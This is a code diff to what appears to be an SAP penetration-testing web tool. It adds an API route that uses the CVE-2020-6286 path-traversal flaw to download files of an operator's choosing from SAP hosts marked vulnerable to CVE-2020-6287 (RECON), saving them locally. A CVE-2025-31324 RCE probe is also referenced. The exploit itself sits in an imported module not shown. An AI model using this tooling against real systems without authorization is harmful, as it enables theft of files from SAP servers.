@@ -1246,6 +1246,54 @@ def create_app(api: SAPMAPApi) -> Bottle:
         _bg(f"{sid}:check_cve_6287", "Check CVE-2020-6287", _run)
         return json.dumps({"status": "started"})
 
+    @app.route("/api/node/<sid>/recon_traversal", method="POST")
+    def node_recon_traversal(sid):
+        """CVE-2020-6286 queryProtocol traversal — download a .zip file."""
+        response.content_type = "application/json"
+        data = request.json or {}
+        node = api.state.get_node(sid)
+        if not node:
+            return json.dumps({"error": f"Node {sid} not found"})
+        if not getattr(node, "cve_2020_6287_vulnerable", False):
+            return json.dumps(
+                {"error": "Node is not marked vulnerable to CVE-2020-6287 "
+                          "— run the RECON check first"})
+        path = (data.get("path") or "").strip()
+        if not path:
+            return json.dumps({"error": "path is required"})
+
+        def _run():
+            from sap_cve_2020_6287 import download_file_via_traversal as _dl
+            host = node.ip or node.hostname
+            port = getattr(node, "cve_2020_6287_port", 0) or 0
+            https = getattr(node, "cve_2020_6287_https", False)
+            if not port:
+                print(f"[-] {sid}: no known RECON port — cannot run traversal")
+                return
+            print(f"[*] {sid}: CVE-2020-6286 queryProtocol traversal — "
+                  f"requesting {path}.zip from {host}:{port}")
+            r = _dl(host, port, path, use_https=https, timeout=30)
+            if not r.get("success"):
+                print(f"[-] {sid}: traversal failed — {r.get('evidence', '?')}")
+                return
+            raw = r.get("data") or b""
+            # Persist the downloaded zip under states/
+            import os as _os
+            from datetime import datetime as _dt
+            states_dir = _os.path.join(_os.path.dirname(__file__), "states")
+            _os.makedirs(states_dir, exist_ok=True)
+            ts = _dt.now().strftime("%Y%m%d_%H%M%S")
+            safe_name = (path.strip("/").replace("/", "_")
+                                .replace("\\", "_").replace(":", "_")) or "file"
+            fpath = _os.path.join(states_dir,
+                                   f"recon_traversal_{sid}_{safe_name}_{ts}.zip")
+            with open(fpath, "wb") as fh:
+                fh.write(raw)
+            print(f"[+] {sid}: downloaded {len(raw)} bytes → {fpath}")
+
+        _bg(f"{sid}:recon_traversal", "RECON Traversal", _run)
+        return json.dumps({"status": "started"})
+
     @app.route("/api/node/<sid>/check_cve_2025_31324", method="POST")
     def node_check_cve_2025_31324(sid):
         """Probe Java ports for CVE-2025-31324 (metadatauploader unauth RCE).
